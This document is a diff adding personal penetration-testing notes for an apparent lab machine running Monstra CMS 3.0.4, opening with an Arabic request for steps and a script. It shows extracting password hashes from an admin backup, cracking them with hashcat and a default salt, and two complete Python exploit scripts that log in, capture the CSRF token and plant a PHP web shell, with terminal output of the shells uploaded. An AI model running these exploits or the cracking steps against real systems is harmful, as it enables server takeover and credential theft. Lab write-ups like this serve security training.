@@ -1,0 +1,769 @@
+
+
+
+
+ابي اسوي قت هب لكل الطريقه
+
+
+
+حط الخطوات و السكربت؟
+
+
+
+Monstra – Version 3.0.4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Exploring the administrator portal, we realize that we can create and download a backup of the web server. From that I can see the hashes of admin and Mike.
+
+
+
+### 3️⃣ Backup Abuse
+
+
+
+**Create & Download Website Backup**
+
+
+
+- Location:
+
+    
+
+
+
+`Admin Panel → System → Backups`
+
+
+
+- Contains:
+
+    
+
+    - Database
+
+        
+
+    - users.table.xml
+
+        
+
+    - Password hashes
+
+        
+
+    - Config files
+
+
+
+
+
+
+
+![[HTB/website/Monstra/Misconfigurations/images/Pasted image 20260130013434.png]]
+
+
+
+
+
+
+
+![[HTB/website/Monstra/Misconfigurations/images/Pasted image 20260130013521.png]]
+
+
+
+
+
+
+
+![[HTB/website/Monstra/Misconfigurations/images/Pasted image 20260130013634.png]]
+
+
+
+
+
+
+
+
+
+![[HTB/website/Monstra/Misconfigurations/images/Pasted image 20260130013608.png]]
+
+
+
+
+
+
+
+
+
+
+
+## Extracting and Cracking Credentials from Monstra Backup
+
+
+
+Upon analyzing the extracted credentials from the Monstra CMS backup, the password hashes appeared to be **MD5-based**. Initial attempts to crack the hashes using the **rockyou** wordlist failed, indicating that the hashes were **salted**.
+
+
+
+At this point, further research revealed that **Monstra CMS uses a default salt value of `YOUR_SALT_HERE`**, which remains unchanged if the administrator does not modify it during installation. Additionally, the number of MD5 iterations used by the application can be determined using the **`mdxfind`** tool, available from the TechSolvency website.
+
+
+
+---
+
+
+
+## Identifying the Hash Format and Iterations
+
+
+
+First, the salt and a test password were prepared:
+
+
+
+`echo "YOUR_SALT_HERE" > salt.txt echo "wazkowski" > pass.txt`
+
+
+
+The admin hash was then tested using `mdxfind`:
+
+
+
+`echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h MD5 -s salt.txt pass.txt -i 5`
+
+
+
+The output indicated:
+
+
+
+`1 MD5PASSSALTx02 hashes found`
+
+
+
+This confirms that:
+
+
+
+- The hash type is **MD5(password + salt)**
+
+    
+
+- The number of iterations is **2**
+
+
+
+
+
+
+
+
+
+## Hash Analysis and Cracking Mike’s Credentials
+
+
+
+According to further analysis, the password hashes used by Monstra CMS are generated using **double MD5 with salting**.
+
+
+
+The salt value was discovered in the following file:
+
+
+
+`C:\xampp\htdocs\blog\boot\defines.php`
+
+
+
+The value was found to be:
+
+
+
+`YOUR_SALT_HERE`
+
+
+
+This is the **default salt value**, indicating that it was never changed during installation.
+
+
+
+---
+
+
+
+## Identifying the Hashing Algorithm
+
+
+
+Reviewing the source code in:
+
+
+
+`C:\xampp\htdocs\blog\engine\Security.php`
+
+
+
+revealed the exact hashing mechanism used by Monstra CMS.  
+
+The application applies **MD5 twice**, combined with a static salt value.
+
+
+
+This hashing scheme corresponds perfectly to **Hashcat mode 2600 (md5(md5($pass).$salt))**.
+
+
+
+---
+
+
+
+## Preparing Hashcat Rule for Salting
+
+
+
+To crack Mike’s password, a custom Hashcat rule was created to append the salt to each word in the wordlist.
+
+
+
+### Rule file (`rule.txt`):
+
+
+
+`$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E`
+
+
+
+**Explanation:**
+
+
+
+- `$<char>` appends a character to each word
+
+    
+
+- `\x5F` is the hexadecimal representation of `_`
+
+    
+
+- This results in appending `YOUR_SALT_HERE` to every candidate password
+
+    
+
+
+
+---
+
+
+
+## Cracking the Hash
+
+
+
+Mike’s password hash was stored in `hash.txt`:
+
+
+
+`844ffc2c7150b93c4133a6ff2e1a2dba`
+
+
+
+Hashcat was then executed as follows:
+
+
+
+`hashcat -m 2600 hash.txt rockyou.txt -r rule.txt`
+
+
+
+### ✅ Result:
+
+
+
+`Password found: Mike14`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+3 there
+
+
+
+Describe the bug
+
+An attacker could insert any executable code through php via Theme Blog to execution command in the server
+
+
+
+To Reproduce
+
+https://github.com/monstra-cms/monstra/issues/470
+
+
+
+Log into the panel.
+
+Go to "/monstra-3.0.4/admin/index.php?id=themes&action=edit_template&filename=blog"
+
+Click edit Blog
+
+Insert payload easy-simple-php-webshell.php
+
+Reload page review code excution
+
+image
+
+
+
+image
+
+
+
+┌──(kali㉿kali)-[/mnt/…/Proving-Grounds-Practice/Windows/Easy/Monster]
+
+└─$ python3 52038.py http://monster.pg/blog admin wazowski
+
+[*] Logging in...
+
+[+] Login successful
+
+[*] Uploading web shell...
+
+[+] Shell uploaded: http://monster.pg/blog/public/themes/default/pth8e.chunk.php
+
+[+] Try: http://monster.pg/blog/public/themes/default/pth8e.chunk.php?cmd=whoami
+
+┌──(kali㉿kali)-[/mnt/…/Proving-Grounds-Practice/Windows/Easy/Monster]
+
+└─$ cat 52038.py         
+
+#!/usr/bin/env python3
+
+# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+
+# Author: Ahmet Ümit BAYRAM (fixed)
+
+# Tested on: PG Practice
+
+ 
+
+import requests
+
+import random
+
+import string
+
+import time
+
+import re
+
+import sys
+
+ 
+
+if len(sys.argv) < 4:
+
+    print("Usage: python3 52038.py <url> <username> <password>")
+
+    sys.exit(1)
+
+ 
+
+base_url = sys.argv[1].rstrip("/")
+
+username = sys.argv[2]
+
+password = sys.argv[3]
+
+ 
+
+session = requests.Session()
+
+ 
+
+login_url = f"{base_url}/admin/index.php?id=dashboard"
+
+login_data = {
+
+    "login": username,
+
+    "password": password,
+
+    "login_submit": "Log+In"
+
+}
+
+ 
+
+filename = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
+
+ 
+
+print("[*] Logging in...")
+
+response = session.post(login_url, data=login_data)
+
+ 
+
+if "Dashboard" not in response.text:
+
+    print("[-] Login failed")
+
+    sys.exit(1)
+
+ 
+
+print("[+] Login successful")
+
+time.sleep(2)
+
+ 
+
+edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
+
+response = session.get(edit_url)
+
+ 
+
+token_search = re.search(
+
+    r'<input type="hidden" id="csrf" name="csrf" value="([^"]+)"',
+
+    response.text
+
+)
+
+ 
+
+if not token_search:
+
+    print("[-] CSRF token not found")
+
+    sys.exit(1)
+
+ 
+
+token = token_search.group(1)
+
+ 
+
+content = """
+
+<?php
+
+if(isset($_GET['cmd'])){
+
+    system($_GET['cmd']);
+
+}
+
+?>
+
+"""
+
+ 
+
+edit_data = {
+
+    "csrf": token,
+
+    "name": filename,
+
+    "content": content,
+
+    "add_file": "Save"
+
+}
+
+ 
+
+print("[*] Uploading web shell...")
+
+response = session.post(edit_url, data=edit_data)
+
+time.sleep(2)
+
+ 
+
+if response.status_code == 200:
+
+    shell_url = f"{base_url}/public/themes/default/{filename}.chunk.php"
+
+    print(f"[+] Shell uploaded: {shell_url}")
+
+    print(f"[+] Try: {shell_url}?cmd=whoami")
+
+else:
+
+    print("[-] Upload failed")
+
+┌──(kali㉿kali)-[/mnt/…/Proving-Grounds-Practice/Windows/Easy/Monster]
+
+└─$ python3 3.py http://monster.pg/blog admin wazowski    
+
+[*] Logging in...
+
+[+] Login successful
+
+[+] CSRF token captured
+
+[*] Uploading shell...
+
+[+] Shell uploaded successfully!
+
+[+] URL: http://monster.pg/blog/public/themes/default/hij97.chunk.php
+
+#!/usr/bin/env python3
+
+# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+
+# Date: 05.05.2024
+
+# Exploit Author: Ahmet Ümit BAYRAM
+
+# Version: 3.0.4
+
+ 
+
+import requests
+
+import random
+
+import string
+
+import time
+
+import re
+
+import sys
+
+ 
+
+# ======================
+
+# ARGUMENTS CHECK
+
+# ======================
+
+if len(sys.argv) != 4:
+
+    print(f"Usage: python3 {sys.argv[0]} <url> <username> <password>")
+
+    sys.exit(1)
+
+ 
+
+base_url = sys.argv[1].rstrip("/")
+
+username = sys.argv[2]
+
+password = sys.argv[3]
+
+ 
+
+session = requests.Session()
+
+ 
+
+# ======================
+
+# LOGIN
+
+# ======================
+
+login_url = f"{base_url}/admin/index.php?id=dashboard"
+
+login_data = {
+
+    "login": username,
+
+    "password": password,
+
+    "login_submit": "Log In"
+
+}
+
+ 
+
+print("[*] Logging in...")
+
+response = session.post(login_url, data=login_data)
+
+ 
+
+if "Dashboard" not in response.text:
+
+    print("[-] Login failed")
+
+    sys.exit(1)
+
+ 
+
+print("[+] Login successful")
+
+time.sleep(2)
+
+ 
+
+# ======================
+
+# GET CSRF TOKEN
+
+# ======================
+
+edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
+
+response = session.get(edit_url)
+
+ 
+
+csrf_match = re.search(
+
+    r'name="csrf"\s+value="([^"]+)"',
+
+    response.text
+
+)
+
+ 
+
+if not csrf_match:
+
+    print("[-] CSRF token not found")
+
+    sys.exit(1)
+
+ 
+
+token = csrf_match.group(1)
+
+print("[+] CSRF token captured")
+
+ 
+
+# ======================
+
+# PREPARE WEB SHELL
+
+# ======================
+
+filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+
+ 
+
+content = """
+
+<html>
+
+<body>
+
+<form method="GET">
+
+<input type="text" name="cmd" size="80" autofocus>
+
+<input type="submit" value="Execute">
+
+</form>
+
+<pre>
+
+<?php
+
+if (isset($_GET['cmd'])) {
+
+    system($_GET['cmd']);
+
+}
+
+?>
+
+</pre>
+
+</body>
+
+</html>
+
+"""
+
+ 
+
+edit_data = {
+
+    "csrf": token,
+
+    "name": filename,
+
+    "content": content,
+
+    "add_file": "Save"
+
+}
+
+ 
+
+print("[*] Uploading shell...")
+
+response = session.post(edit_url, data=edit_data)
+
+time.sleep(2)
+
+ 
+
+# ======================
+
+# RESULT
+
+# ======================
+
+if response.status_code == 200:
+
+    shell_url = f"{base_url}/public/themes/default/{filename}.chunk.php"
+
+    print("[+] Shell uploaded successfully!")
+
+    print(f"[+] URL: {shell_url}")
+
+else:
+
+    print("[-] Failed to upload shell")
